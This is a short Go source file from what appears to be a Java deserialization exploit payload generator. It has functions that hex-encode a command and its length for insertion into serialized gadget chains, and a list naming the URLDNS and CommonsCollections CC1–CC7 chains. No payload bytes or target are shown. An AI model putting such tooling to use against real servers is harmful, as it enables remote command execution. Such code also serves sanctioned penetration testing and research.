package gadgets

import (
	"encoding/hex"
	"strconv"
	"strings"
)

func GenerateCmd(cmd string) string {
	toString := hex.EncodeToString([]byte(cmd))
	num := strconv.FormatInt(int64(len(cmd)), 16)
	if len(cmd)<16{
		return "0"+num+toString
	}else {
		return num+toString
	}
}
func Tirck(cmd string) string {
	num2, _ := strconv.Atoi(strconv.FormatInt(0xaa, 10))
	num := strconv.FormatInt(int64(len(cmd)+num2), 16)
	return num
}
func url(cmd string) string {
	comma := strings.Index(cmd, "//")
	cmd1:=cmd[comma+2:]
	toString := hex.EncodeToString([]byte(cmd1))
	return toString
}
func GetAllNames() []string {
	return []string{
		URLDNS,
		CC1,
		CC2,
		CC3,
		CC4,
		CC5,
		CC6,
		CC7,
	}
}
